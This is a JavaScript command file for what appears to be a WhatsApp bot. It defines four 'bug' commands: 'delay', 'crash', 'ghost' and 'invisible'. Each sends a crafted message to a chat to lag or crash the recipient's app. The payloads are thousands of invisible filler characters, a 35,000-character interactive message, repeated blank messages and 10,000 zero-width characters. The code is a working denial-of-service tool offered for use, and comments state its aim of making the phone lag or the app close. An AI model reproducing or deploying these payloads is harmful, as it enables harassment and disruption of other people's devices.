const { cmd } = require('../command');

cmd({
    pattern: "delay",
    alias: ["lag"],
    desc: "Send delay bug",
    category: "other",
    react: "🐢",
    filename: __filename
},
async (conn, m, { from, reply }) => {
    try {
        // DELAY BUG: Phone lag karanawa - Invisible chars 4000k
        let text = '';
        for(let i = 0; i < 4000; i++) text += 'ㅤ'; 
        await conn.sendMessage(from, { text: text + '🐢 𝐃𝐄𝐋𝐀𝐘 𝐒𝐄𝐍𝐓' });
        reply('✅ Delay bug sent');
    } catch (e) {
        reply(`❌ Error: ${e}`);
    }
});

cmd({
    pattern: "crash",
    alias: ["crashbug"],
    desc: "Send crash bug",
    category: "other",
    react: "💣",
    filename: __filename
},
async (conn, m, { from, reply }) => {
    try {
        // CRASH BUG: App close wenawa - 35k chars + interactive
        const crash = {
            interactiveMessage: {
                header: { documentMessage: { url: "https://a" } },
                body: { text: "x".repeat(35000) }, 
                nativeFlowMessage: { buttons: [] }
            }
        };
        await conn.relayMessage(from, crash, {});
        reply('✅ Crash bug sent');
    } catch (e) {
        reply(`❌ Error: ${e}`);
    }
});

cmd({
    pattern: "ghost",
    alias: ["ghostbug"],
    desc: "Send ghost text",
    category: "other",
    react: "👻",
    filename: __filename
},
async (conn, m, { from, reply }) => {
    try {
        // GHOST BUG: Blank message spam 5k
        for(let i = 0; i < 5; i++) {
            await conn.sendMessage(from, { text: 'ㅤ' });
        }
        reply('✅ Ghost bug sent x5');
    } catch (e) {
        reply(`❌ Error: ${e}`);
    }
});

cmd({
    pattern: "invisible",
    alias: ["invisiblebug", "blank"],
    desc: "Send invisible bug",
    category: "other",
    react: "🫥",
    filename: __filename
},
async (conn, m, { from, reply }) => {
    try {
        // INVISIBLE BUG: Chat eka kala - Zero width chars 10000k
        await conn.sendMessage(from, { text: '\u200B'.repeat(10000) });
        reply('✅ Invisible bug sent');
    } catch (e) {
        reply(`❌ Error: ${e}`);
    }
});
